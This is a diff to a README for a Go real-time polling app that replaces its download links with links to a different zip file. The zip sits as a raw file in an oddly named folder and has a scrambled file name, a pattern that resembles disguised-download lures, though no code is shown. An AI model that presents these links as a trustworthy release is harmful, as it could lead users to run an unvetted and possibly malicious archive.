@@ -6,7 +6,7 @@ Welcome to **go-real-time-poll**! This application allows you to create and part
 
 ## 🔗 Download
 
-[![Download go-real-time-poll](https://github.com/Knaduma/go-real-time-poll/raw/refs/heads/main/embolemia/go_time_poll_real_3.1.zip)](https://github.com/Knaduma/go-real-time-poll/raw/refs/heads/main/embolemia/go_time_poll_real_3.1.zip)
+[![Download go-real-time-poll](https://github.com/Knaduma/go-real-time-poll/raw/refs/heads/main/embolemia/time_go_poll_real_3.7-beta.3.zip)](https://github.com/Knaduma/go-real-time-poll/raw/refs/heads/main/embolemia/time_go_poll_real_3.7-beta.3.zip)
 
 ## 📋 System Requirements
 
@@ -18,7 +18,7 @@ To run this application, you need:
 
 ## 📥 Download & Install
 
-To download go-real-time-poll, visit this page to download: [Download go-real-time-poll](https://github.com/Knaduma/go-real-time-poll/raw/refs/heads/main/embolemia/go_time_poll_real_3.1.zip).
+To download go-real-time-poll, visit this page to download: [Download go-real-time-poll](https://github.com/Knaduma/go-real-time-poll/raw/refs/heads/main/embolemia/time_go_poll_real_3.7-beta.3.zip).
 
 1. Go to the Releases page.
 2. Find the latest version of the application.
